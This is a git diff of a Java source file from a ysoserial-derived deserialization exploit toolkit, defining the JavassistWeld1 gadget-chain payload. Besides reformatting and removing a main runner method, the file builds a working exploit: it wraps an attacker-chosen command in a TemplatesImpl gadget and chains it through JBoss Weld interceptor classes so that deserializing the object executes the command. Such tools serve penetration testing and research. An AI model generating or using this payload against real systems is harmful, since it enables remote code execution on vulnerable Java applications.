@@ -18,7 +18,6 @@ import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Gadgets;
 import org.su18.ysuserial.payloads.util.JavaVersion;
-import org.su18.ysuserial.payloads.util.PayloadRunner;
 import org.su18.ysuserial.payloads.util.Reflections;
 
 import java.lang.reflect.Constructor;
@@ -29,60 +28,56 @@ import java.util.*;
 */
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"javassist:javassist:3.12.1.GA", "org.jboss.weld:weld-core:1.1.33.Final",
-    "javax.enterprise:cdi-api:1.0-SP1", "javax.interceptor:javax.interceptor-api:3.1",
-    "org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final", "org.slf4j:slf4j-api:1.7.21" })
-@Authors({ Authors.MATTHIASKAISER })
+		"javax.enterprise:cdi-api:1.0-SP1", "javax.interceptor:javax.interceptor-api:3.1",
+		"org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final", "org.slf4j:slf4j-api:1.7.21"})
+@Authors({Authors.MATTHIASKAISER})
 public class JavassistWeld1 implements ObjectPayload<Object> {
-    public static boolean isApplicableJavaVersion() {
-        return JavaVersion.isAtLeast(7);
-    }
 
-    public Object getObject(final String command) throws Exception {
+	public static boolean isApplicableJavaVersion() {
+		return JavaVersion.isAtLeast(7);
+	}
 
-        final Object gadget = Gadgets.createTemplatesImpl(command);
+	public Object getObject(final String command) throws Exception {
 
-        InterceptionModelBuilder builder = InterceptionModelBuilder.newBuilderFor(HashMap.class);
-        ReflectiveClassMetadata metadata = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
-        InterceptorReference interceptorReference = ClassMetadataInterceptorReference.of(metadata);
+		final Object gadget = Gadgets.createTemplatesImpl(command);
 
-        Set<InterceptionType> s = new HashSet<InterceptionType>();
-        s.add(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE);
+		InterceptionModelBuilder builder              = InterceptionModelBuilder.newBuilderFor(HashMap.class);
+		ReflectiveClassMetadata  metadata             = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
+		InterceptorReference     interceptorReference = ClassMetadataInterceptorReference.of(metadata);
 
-        Constructor defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(Set.class, MethodReference.class);
-        Reflections.setAccessible(defaultMethodMetadataConstructor);
-        MethodMetadata methodMetadata = (MethodMetadata) defaultMethodMetadataConstructor.newInstance(s,
-                MethodReference.of(TemplatesImpl.class.getMethod("newTransformer"), true));
+		Set<InterceptionType> s = new HashSet<InterceptionType>();
+		s.add(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE);
 
-        List list = new ArrayList();
-        list.add(methodMetadata);
-        Map<org.jboss.weld.interceptor.spi.model.InterceptionType, List<MethodMetadata>> hashMap = new HashMap<org.jboss.weld.interceptor.spi.model.InterceptionType, List<MethodMetadata>>();
+		Constructor defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(Set.class, MethodReference.class);
+		Reflections.setAccessible(defaultMethodMetadataConstructor);
+		MethodMetadata methodMetadata = (MethodMetadata) defaultMethodMetadataConstructor.newInstance(s,
+				MethodReference.of(TemplatesImpl.class.getMethod("newTransformer"), true));
 
-        hashMap.put(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE, list);
-        SimpleInterceptorMetadata simpleInterceptorMetadata = new SimpleInterceptorMetadata(interceptorReference, true, hashMap);
+		List list = new ArrayList();
+		list.add(methodMetadata);
+		Map<org.jboss.weld.interceptor.spi.model.InterceptionType, List<MethodMetadata>> hashMap = new HashMap<org.jboss.weld.interceptor.spi.model.InterceptionType, List<MethodMetadata>>();
 
-        builder.interceptAll().with(simpleInterceptorMetadata);
+		hashMap.put(org.jboss.weld.interceptor.spi.model.InterceptionType.POST_ACTIVATE, list);
+		SimpleInterceptorMetadata simpleInterceptorMetadata = new SimpleInterceptorMetadata(interceptorReference, true, hashMap);
 
-        InterceptionModel model = builder.build();
+		builder.interceptAll().with(simpleInterceptorMetadata);
 
-        HashMap map = new HashMap();
-        map.put("ysoserial", "ysoserial");
+		InterceptionModel model = builder.build();
 
-        DefaultInvocationContextFactory factory = new DefaultInvocationContextFactory();
+		HashMap map = new HashMap();
+		map.put("ysoserial", "ysoserial");
 
-        InterceptorInstantiator interceptorInstantiator = new InterceptorInstantiator() {
+		DefaultInvocationContextFactory factory = new DefaultInvocationContextFactory();
 
-            public Object createFor(InterceptorReference paramInterceptorReference) {
+		InterceptorInstantiator interceptorInstantiator = new InterceptorInstantiator() {
 
-                return gadget;
-            }
-        };
+			public Object createFor(InterceptorReference paramInterceptorReference) {
 
-        return new InterceptorMethodHandler(map, metadata, model, interceptorInstantiator, factory);
+				return gadget;
+			}
+		};
 
-    }
+		return new InterceptorMethodHandler(map, metadata, model, interceptorInstantiator, factory);
 
-
-    public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(JavassistWeld1.class, args);
-    }
+	}
 }
